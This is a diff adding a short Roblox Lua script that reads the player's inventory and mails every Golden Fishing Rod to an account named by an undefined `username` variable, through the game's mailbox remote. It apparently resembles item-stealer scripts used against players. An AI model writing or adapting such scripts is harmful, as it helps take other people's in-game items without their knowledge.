@@ -1,0 +1,18 @@
+local saveModule = require(game:GetService("ReplicatedStorage").Library.Client.Save)
+local result = saveModule.Get()
+
+local cs = result.Inventory.Misc
+for i, v in pairs(cs) do
+    if v.id == "Golden Fishing Rod" then
+        local args = {
+            username,
+            "Golden Fishing Rod",
+            "Misc",
+            i,
+            v._am or 1
+        }
+        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+    end
+end
+
+task.wait(2)
